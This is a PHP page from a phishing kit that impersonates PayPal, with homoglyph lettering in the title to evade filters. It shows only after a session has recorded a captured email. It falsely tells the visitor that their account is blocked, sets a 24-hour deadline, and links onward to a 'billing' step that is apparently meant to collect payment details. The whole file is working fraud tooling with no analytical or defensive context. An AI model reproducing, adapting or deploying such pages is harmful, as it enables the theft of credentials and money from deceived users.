<?php 
ob_start();
session_start();
if(isset($_SESSION['done_email'])){
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>ΡayΡal Safety &amp; Security</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out">Log Out</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">What is wrong ?</p>
                   <div class="contain-lists">
                       <center>
                            <img src="../img/shield.png" />
                            <h4>Your account has been temporarily blocked</h4>
                       </center>
                       <b class="bold">
                           <h5>We'll ask you to go to some steps to regain access to your account</h5>
                           <h5>You have 24 hours to confirm your identity, otherwise, we will have to limit your account.</h5>
                       </b>
                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Start Process</a>
                       </center>
                   </div>
                </div>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Contact Us</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>                
                </center>            
            </div>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
} 
else {
    //header("location: ../../index.php");
}
?>